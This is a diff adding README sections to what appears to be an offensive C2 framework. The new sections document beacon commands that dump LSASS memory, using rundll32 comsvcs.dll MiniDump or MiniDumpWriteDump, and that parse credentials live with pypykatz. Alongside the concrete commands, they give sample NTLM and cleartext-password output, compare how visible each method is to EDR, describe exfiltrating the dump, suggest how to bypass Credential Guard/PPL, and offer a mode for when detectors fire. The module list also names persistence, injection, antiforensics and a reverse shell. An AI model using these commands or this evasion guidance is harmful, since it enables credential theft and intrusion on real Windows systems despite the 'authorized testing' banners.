@@ -150,6 +150,143 @@ LSASS memory or recover account passwords, and it refuses to be useful against
 accounts other than the operator's own test host. Use only on systems you are
 authorised to test.
 
+## LSASS process memory dump (Windows; admin required)
+
+> ⚠️ **AUTHORIZED SECURITY TESTING ONLY.** This module produces a minidump of
+> `lsass.exe` — the same capability mimikatz's `sekurlsa::minidump` provides.
+> On non-admin hosts it fails closed with a clear `SeDebugPrivilege` /
+> `OpenProcess` error. Don't ship it into any environment where you don't
+> have explicit written authorisation.
+
+The `lsass` beacon command (`lsass <out_path> [comsvcs|ctypes]`) dumps LSASS
+process memory to a `.dmp` file on the target. Two strategies:
+
+| `prefer=`   | Mechanism                                                    | EDR visibility |
+|-------------|--------------------------------------------------------------|----------------|
+| `comsvcs` (default) | `rundll32 comsvcs.dll, MiniDump <pid> <out> full` — the OS's own signed binary does the dump; mimikatz's default | Lowest — dbghelp.dll never loads into the beacon |
+| `ctypes`    | Direct `MiniDumpWriteDump` via `dbghelp.dll` (after enabling `SeDebugPrivilege`) | Higher — most EDRs flag dbghelp+MiniDumpWriteDump on lsass.exe |
+
+```bash
+beacon[<sid>]> lsass C:\Windows\Temp\ls.dmp
+beacon[<sid>]> lsass C:\Windows\Temp\ls.dmp ctypes    # explicit strategy
+```
+
+The `.dmp` is written on-target. Transfer it off (use `download`, or any
+operator-side exfil channel), then parse with **pypykatz** on your host:
+
+```bash
+# operator host:
+pip install pypykatz
+python3 -m pypykatz lsadump lsass.dmp
+# or, using the bundled CLI driver:
+pip install -e '.[lsass]'
+cscli parse-lsass lsass.dmp
+```
+
+The `lsass-parse` beacon command (`lsass-parse <dump_path>`) runs the same
+pypykatz parse on-target if pypykatz is installed there — usually you want
+to offload the parse to the operator host instead.
+
+**What you can recover from the dump**: WDigest cleartext (if WDigest
+credssp is enabled — Microsoft disabled this by default since Win8.1 but
+many still re-enable it), NTLM hashes, Kerberos TGT/TGS tickets, DPAPI
+master keys, current-user Credential Manager entries, and (when LM is
+enabled) LM hashes. This is ATT&CK **T1003.001**.
+
+**Restrictions**: requires the beacon to run as **admin** (a member of the
+local Administrators group is sufficient — LSASS grants Admins full access
+by default). On a non-admin beacon, `dump_lsass` returns `(False,
+"failed to enable SeDebugPrivilege (run as admin)")` and writes no file.
+The module refuses to run on non-Windows hosts.
+
+The dump module ships with the standard payload, so a generated `beacon.py`
+already contains it — see `cs/payload/__init__.py` `_MODULE_FILES`.
+
+## sekurlsa::logonpasswords (live LSASS parsing; Windows; admin)
+
+> ⚠️ **AUTHORIZED SECURITY TESTING ONLY.** This is mimikatz's
+> `sekurlsa::logonpasswords` reimplemented in Python on top of pypykatz.
+> It reads `lsass.exe` memory **in-process, with no dump file written** —
+> the parsed credentials come straight back to the operator. Don't use
+> this on any system without explicit written authorisation.
+
+The `sekurlsa` beacon command reads the live `lsass.exe` memory via
+pypykatz's `LiveReader` + `apypykatz.start()` and renders the result in
+mimikatz-style output:
+
+```bash
+beacon[<sid>]> sekurlsa
+beacon[<sid>]> sekurlsa --pkgs msv,wdigest,kerberos        # subset only
+beacon[<sid>]> sekurlsa --pid 1234                          # explicit PID
+beacon[<sid>]> sekurlsa --no-lsa                            # skip LSA step
+                                                          # (faster, no cleartext)
+```
+
+The output looks like:
+
+```
+sekurlsa::logonpasswords
+============================================================
+
+Authentication Id : 0;996
+Session           : Service
+User Name         : svc_sql
+Domain            : CONTOSO
+Logon Server      : DC01
+Logon Time        : 2025-01-15 10:30:45
+SID               : S-1-5-...
+
+	msv :
+	 [Primary]
+	 * Username      : svc_sql
+	 * Domain        : CONTOSO
+	 * NTLM          : aad3b435b51404eeaad3b435b51404ee
+	 * SHA1          : da39a3ee5e6b4b0d3255bfef95601890afd80709
+
+	wdigest :
+	 * Username      : svc_sql
+	 * Domain        : CONTOSO
+	 * Password      : P@ssw0rd!
+
+	kerberos :
+	 ...
+```
+
+**Supported SSP packages** (all parsed in one run by default): `msv`,
+`wdigest`, `kerberos` (with ticket recovery when `--pkgs` includes
+`ktickets`), `tspkg`, `ssp`, `livessp`, `dpapi`, `cloudap`.
+
+**Where it can run**:
+
+| Surface                                    | Requires pypykatz? |
+|--------------------------------------------|--------------------|
+| Standard `cscli --payload` beacon.py       | No — sekurlsa unavailable; falls back to `lsass <path>` dump workflow |
+| **PyInstaller-built** `cscli-beacon.exe` (`./scripts/build-binary.sh windows64` on a host with `pip install pypykatz`) | Yes — pypykatz is auto-bundled by PyInstaller |
+| Operator host directly (`cscli sekurlsa [--pid <pid>]`) | Yes — operator must have pypykatz installed |
+
+This split is intentional: pypykatz + transitive deps are several MB of
+Python and can't be inlined into the stdlib-only single-file payload. The
+PyInstaller beacon gets everything bundled.
+
+**Prerequisites on the target**:
+- Windows; Python interpreter bitness must match the OS (64-bit Python on
+  64-bit Windows — enforced by pypykatz's `LiveReader.sanity_check()`).
+- Beacon / operator must be **admin** (member of the local Administrators
+  group is sufficient — LSASS grants Admins full access by default).
+- LSASS must **not** be running as a Protected Process Light (PPL).
+  Win 11 22H2+ with Credential Guard will fail `OpenProcess` with
+  `ERROR_ACCESS_DENIED`. Bypass requires either disabling Credential
+  Guard (group policy / `HKLM\...\Lsa\RunAsPPL` removal + reboot) or a
+  kernel driver to strip the protection. Not implemented in this module.
+
+**`--no-lsa` mode**: skip the LSA template / decryption-key acquisition.
+Faster but you lose the LSA session key needed to decrypt WDigest /
+Kerberos / TSPKG / SSP / LiveSSP cleartext — only MSV (NT/LM hashes)
+survives. Useful when the LSA detector fires but you still want NTLM
+hashes for offline cracking.
+
+**This is ATT&CK T1003.001** — OS Credential Dumping: LSASS Memory.
+
 ## Obfuscation & exploitation-stage helpers
 
 `cs/modules/obfuscation.py`:
@@ -287,7 +424,7 @@ restores prior sessions.
 
 ## Testing
 
-The repo ships three self-tests (no live C2 traffic between hosts, all localhost):
+The repo ships self-tests (no live C2 traffic between hosts, all localhost):
 
 ```bash
 python3 test_e2e.py      # API-level: store + listener + in-process roundtrip
@@ -300,6 +437,8 @@ python3 test_cli_driver.py # non-interactive CLI driver (server/payload/list/tas
 python3 test_rsh.py        # raw TCP reverse shell (real bash callback) in-process
 python3 test_rsh_cli.py    # reverse shell via the non-interactive CLI driver
 python3 test_resilience.py # reconnect on outage + disconnect/delete
+python3 test_lsass.py      # LSASS-dump module unit tests (non-Windows refusal,
+                           #   parse_dump error paths, sekurlsa output format)
 ```
 
 ## Layout
@@ -315,7 +454,8 @@ cs/
   payload/               # standalone payload generation (inlines all deps)
   modules/               # persistence, injection, antiforensics, obfuscation,
                          #   socks (SOCKS5 pivot), credentials, dropper (PE chain),
-                         #   exploitation
+                         #   exploitation, lsass (LSASS minidump + sekurlsa live parse;
+                         #     both authorized-testing-only)
   cli/console.py         # interactive operator CLI
 build/beacon_entry.py    # PyInstaller entrypoint
 scripts/build-binary.sh  # builds the standalone beacon executable
